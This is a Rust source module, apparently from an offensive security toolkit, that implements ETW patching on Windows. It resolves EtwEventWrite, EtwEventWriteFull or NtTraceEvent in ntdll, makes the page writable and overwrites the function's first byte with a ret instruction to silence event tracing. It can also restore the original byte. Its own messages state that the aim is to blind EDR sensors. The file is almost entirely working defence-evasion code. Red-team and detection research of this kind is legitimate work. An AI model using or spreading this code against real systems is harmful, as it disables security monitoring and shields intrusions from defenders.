use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EtwTarget {
    EtwEventWrite,
    EtwEventWriteFull,
    NtTraceEvent,
}

impl EtwTarget {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "etweventwrite" | "etwwrite" | "eventwrite" => Some(Self::EtwEventWrite),
            "etweventwritefull" | "etwwritefull" | "eventwritefull" => {
                Some(Self::EtwEventWriteFull)
            }
            "nttraceevent" | "traceevent" => Some(Self::NtTraceEvent),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::EtwEventWrite => "EtwEventWrite",
            Self::EtwEventWriteFull => "EtwEventWriteFull",
            Self::NtTraceEvent => "NtTraceEvent",
        }
    }

    pub fn dll(&self) -> &'static str {
        "ntdll.dll"
    }

    pub fn all() -> &'static [Self] {
        &[Self::EtwEventWrite, Self::EtwEventWriteFull, Self::NtTraceEvent]
    }
}

pub struct PatchState {
    pub original_bytes: Vec<u8>,
    pub target: String,
    pub address: usize,
}

pub fn dry_run(target: &str, log: &LogSink) {
    let name: &str = EtwTarget::from_str(target).map_or(target, |t| t.name());

    log.info(format!("[DRY RUN] ETW Patching — {name}"));
    log.detail(format!("  Target: {name} in ntdll.dll"));
    log.detail("  Action: Overwrite function entry with 0xC3 (ret)".to_string());
    log.detail("  Effect: Function returns immediately — ETW events are silenced".to_string());
    log.info(String::new());
    log.detail("  Steps that would execute:".to_string());
    log.detail("    [1/4] GetModuleHandleA(\"ntdll.dll\") — get ntdll base".to_string());
    log.detail(format!("    [2/4] GetProcAddress(ntdll, \"{name}\") — resolve function"));
    log.detail("    [3/4] VirtualProtect(PAGE_EXECUTE_READWRITE) — make writable".to_string());
    log.detail("    [4/4] Write 0xC3 (ret) → restore original protection".to_string());
    log.info(String::new());
    log.warning("  ETW is how EDRs receive telemetry even after user-mode unhooking.".to_string());
    log.warning("  Patching EtwEventWrite blinds kernel-callback-based EDR sensors.".to_string());
}

pub fn print_info(log: &LogSink) {
    log.info("=== ETW Patching ===".to_string());
    log.info(String::new());
    log.detail("Event Tracing for Windows (ETW) is the primary telemetry pipeline".to_string());
    log.detail("that EDRs use to monitor process behavior. Even when user-mode hooks".to_string());
    log.detail("are removed (via unhooking or direct syscalls), ETW providers in the".to_string());
    log.detail("kernel still report events through EtwEventWrite.".to_string());
    log.info(String::new());
    log.detail("Patchable targets:".to_string());
    log.detail("  EtwEventWrite     — primary ETW write function in ntdll".to_string());
    log.detail("  EtwEventWriteFull — extended ETW write with extra fields".to_string());
    log.detail("  NtTraceEvent      — low-level NT trace event dispatcher".to_string());
    log.info(String::new());
    log.detail("Technique: overwrite the first byte with 0xC3 (ret instruction).".to_string());
    log.detail("The function returns immediately without logging any event.".to_string());
    log.detail("Original bytes are saved for restoration.".to_string());
}

#[cfg(windows)]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    use std::ffi::CString;
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
    use windows::core::PCSTR;

    let etw_target = EtwTarget::from_str(target)
        .ok_or_else(|| format!("unknown ETW target: {target}"))?;
    let func_name = etw_target.name();
    let dll_name = etw_target.dll();

    log.step(format!("[1/4] GetModuleHandleA(\"{dll_name}\")"));
    let dll_cstr = CString::new(dll_name)
        .map_err(|e| format!("invalid DLL name: {e}"))?;
    let dll_handle = unsafe { GetModuleHandleA(PCSTR(dll_cstr.as_ptr() as *const u8)) }
        .map_err(|e| format!("GetModuleHandleA failed: {e} — ntdll should always be loaded"))?;

    log.step(format!("[2/4] GetProcAddress(\"{func_name}\")"));
    let func_cstr = CString::new(func_name)
        .map_err(|e| format!("invalid function name: {e}"))?;
    let func_addr = unsafe { GetProcAddress(dll_handle, PCSTR(func_cstr.as_ptr() as *const u8)) }
        .ok_or_else(|| format!("GetProcAddress failed: {func_name} not found in {dll_name}"))?;
    let addr = func_addr as usize;
    log.detail(format!("  Address: 0x{addr:016X}"));

    let original_byte = unsafe { *(addr as *const u8) };
    log.detail(format!("  Original first byte: 0x{original_byte:02X}"));

    log.step("[3/4] VirtualProtect → PAGE_EXECUTE_READWRITE".to_string());
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            addr as *const std::ffi::c_void,
            1,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    }
    .map_err(|e| format!("VirtualProtect (make writable) failed: {e}"))?;

    log.step("[4/4] Writing 0xC3 (ret) → restoring protection".to_string());
    unsafe {
        *(addr as *mut u8) = 0xC3;
    }

    let mut discard = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            addr as *const std::ffi::c_void,
            1,
            old_protect,
            &mut discard,
        )
    }
    .map_err(|e| format!("VirtualProtect (restore) failed: {e}"))?;

    log.info(format!("  ✓ {func_name} patched — ETW events silenced"));

    Ok(PatchState {
        original_bytes: vec![original_byte],
        target: func_name.to_string(),
        address: addr,
    })
}

#[cfg(windows)]
pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
    use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

    let addr = state.address;
    log.step(format!("[1/2] VirtualProtect → PAGE_EXECUTE_READWRITE (0x{addr:016X})"));

    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        )
    }
    .map_err(|e| format!("VirtualProtect (make writable) failed: {e}"))?;

    log.step("[2/2] Restoring original bytes".to_string());
    for (i, &byte) in state.original_bytes.iter().enumerate() {
        unsafe {
            *((addr + i) as *mut u8) = byte;
        }
    }

    let mut discard = PAGE_PROTECTION_FLAGS(0);
    unsafe {
        VirtualProtect(
            addr as *const std::ffi::c_void,
            state.original_bytes.len(),
            old_protect,
            &mut discard,
        )
    }
    .map_err(|e| format!("VirtualProtect (restore) failed: {e}"))?;

    log.info(format!("  ✓ {} restored to original bytes", state.target));
    Ok(())
}

#[cfg(not(windows))]
pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
    let etw_target = EtwTarget::from_str(target)
        .ok_or_else(|| format!("unknown ETW target: {target}"))?;
    log.warning(format!(
        "  ETW patching requires Windows. Would patch {} in {}.",
        etw_target.name(),
        etw_target.dll()
    ));
    Err("ETW patching is only available on Windows".to_string())
}

#[cfg(not(windows))]
pub fn restore(_state: &PatchState, log: &LogSink) -> Result<(), String> {
    log.warning("  ETW restore requires Windows.".to_string());
    Err("ETW restore is only available on Windows".to_string())
}
